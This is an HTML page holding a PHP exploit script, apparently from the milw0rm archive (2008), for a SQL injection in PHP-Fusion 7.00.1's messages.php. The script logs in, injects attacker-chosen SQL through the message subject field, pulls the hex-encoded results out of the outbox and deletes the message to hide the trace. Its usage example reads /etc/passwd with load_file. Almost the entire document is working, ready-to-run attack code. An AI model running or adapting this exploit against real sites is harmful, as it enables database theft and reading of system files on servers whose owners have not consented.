<html><head><title>PHP-Fusion 7.00.1 (messages.php) Remote SQL Injection Exploit</title></head><pre>&lt;?php
/*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
 PHP-Fusion 7.00.1 (messages.php) Remote SQL Injection Exploit
 requires magic_quotes == off

 coded by irk4z[at]yahoo.pl
 homepage: http://irk4z.wordpress.com

 greets: all friends ;)
*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*/

$host = $argv[1];
$path = $argv[2];
$login = $argv[3];
$pass = $argv[4];
$sql_injection = $argv[5];

echo
&quot;*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*\n&quot;.
&quot; PHP-Fusion 7.00.1 (messages.php) Remote SQL Injection Exploit\n&quot;.
&quot; requires magic_quotes == off\n&quot;.
&quot;\n&quot;.
&quot; coded by irk4z[at]yahoo.pl\n&quot;.
&quot; homepage: http://irk4z.wordpress.com\n&quot;.
&quot;\n&quot;.
&quot; greets: all friends ;)\n&quot;.
&quot;*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*\n&quot;;

if(empty($host) || empty($path) || empty($login) || empty($pass) || empty($sql_injection) ){
	echo &quot;Usage: php $argv[0] &lt;host&gt; &lt;path&gt; &lt;login&gt; &lt;pass&gt; &lt;SQL&gt;\n&quot; .
		 &quot;       php $argv[0] localhost /php-fusion/ user s3cret \&quot;SELECT database()\&quot;\n&quot;.
		 &quot;       php $argv[0] localhost / user s3cret \&quot;SELECT load_file(0x2F6574632F706173737764)\&quot;\n\n&quot;;
	die;
}

echo &quot;Logging into system...&quot;;
//login to php-fusion using login and pass
$login_data = send($host, array(	&quot;path&quot; =&gt; $path.&quot;news.php&quot;,
					&quot;post&quot; =&gt; array(
							&quot;user_name&quot; =&gt; $login,
							&quot;user_pass&quot; =&gt; $pass,
							&quot;login&quot; =&gt; &quot;Login&quot;
							)
				)
			);

//get cookies
preg_match_all(&quot;/Set-Cookie:[\s]+([a-z_A-Z0-9]+=[a-z_A-Z0-9\.]+;)/&quot;, $login_data, $matches);
$cookies = implode(' ', $matches[1]);

//get user id
preg_match_all(&quot;/([0-9])+.([a-zA-Z0-9]{32})/&quot;, $cookies, $matches);
$my_id = $matches[1][0];

if(empty($my_id)){
	echo &quot;\n[x] Incorrect login or password..&quot;;
	die;
} else {
	echo &quot;[ok]\n&quot;;
}

$id_message = uniqid();
$inhex = '';
for($i = 0; $i &lt; strlen($id_message); $i++) $inhex .= dechex( ord($id_message[$i]) ) ;

echo &quot;Running sql-injection...\n&quot;;
//running sql-injection
$res = send($host, array(	&quot;path&quot; =&gt; $path.&quot;messages.php?msg_send={$my_id}%27%2F%2Axxx&amp;&quot;,
				&quot;cookie&quot; =&gt; $cookies,
				&quot;post&quot; =&gt; array(
						&quot;send_message&quot; =&gt; 'X',
						&quot;subject&quot; =&gt; &quot;X*/,0x{$inhex},								(SELECT/**/concat(0x{$inhex}{$inhex},hex(($sql_injection)),0x{$inhex}{$inhex})),0x79,1,1226787120,1)/*&quot;,
						&quot;message&quot; =&gt; &quot;XXX&quot;
						)
			)
		);

echo &quot;Getting data...\n\n&quot;;
$res = send($host, array(	&quot;path&quot; =&gt; $path.&quot;messages.php?folder=outbox&quot;,
				&quot;cookie&quot; =&gt; $cookies )
			);

preg_match_all(&quot;/msg_read=([0-9]+)'&gt;{$id_message}&lt;\/a&gt;/&quot;, $res, $matches);
$id_message_number = $matches[1][0];

$res = send($host, array(	&quot;path&quot; =&gt; $path.&quot;messages.php?folder=outbox&amp;msg_read=&quot;.$id_message_number,
				&quot;cookie&quot; =&gt; $cookies )
		);

preg_match_all(&quot;/{$id_message}{$id_message}(.*){$id_message}{$id_message}/&quot;, $res, $matches);

if( empty($matches[1][0]) ){
	echo &quot;[x] Failed... maybe SQL-INJ is incorrect?\n\n&quot;;
} else {
	$tmp = '';
	$hex = $matches[1][0];
	//unhex it!
	for($i = 0; $i &lt; strlen($hex); $i+=2) $tmp .= chr(hexdec($hex[$i] . $hex[$i+1]));
	echo &quot;DATA: \n&quot;.$tmp.&quot;\n\n&quot;;
}

echo &quot;Deleting message...\n&quot;;

$res = send($host, array(	&quot;path&quot; =&gt; $path.&quot;messages.php?folder=outbox&amp;msg_id=&quot;.$id_message_number,
				&quot;cookie&quot; =&gt; $cookies,
				&quot;post&quot; =&gt; array (
						&quot;delete&quot; =&gt; &quot;Delete&quot;
						)
			)
		);

//send http packet
function send($host, $dane = &quot;&quot;) {
	$packet = (empty($dane['post']) ? &quot;GET&quot; : &quot;POST&quot;) . &quot; {$dane[&quot;path&quot;]} HTTP/1.1\r\n&quot;;
	$packet .= &quot;Host: {$host}\r\n&quot;;
	
	if( !empty($dane['cookie']) ){
		$packet .= &quot;Cookie: {$dane['cookie']}\r\n&quot;;
	}
	
	if( !empty($dane['post']) ){
		$reszta_syfu = &quot;&quot;;
		foreach($dane['post'] as $tmp =&gt; $tmp2){
			$reszta_syfu .= $tmp . &quot;=&quot; . $tmp2 . &quot;&amp;&quot;;
		}
		$packet .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
		$packet .= &quot;Connection: Close\r\n&quot;;
		$packet .= &quot;Content-Length: &quot;.strlen($reszta_syfu).&quot;\r\n\r\n&quot;;
		$packet .= $reszta_syfu;
	} else {
		$packet .= &quot;Connection: Close\r\n\r\n&quot;;
	}

	$o = @fsockopen($host, 80);
	if(!$o){
		echo &quot;\n[x] No response...\n&quot;;
		die;
	}
	fputs($o, $packet);
	while (!feof($o)) $ret .= fread($o, 1024);
	fclose($o);
	return ($ret);
}

?&gt;

# milw0rm.com [2008-11-20]</pre></html>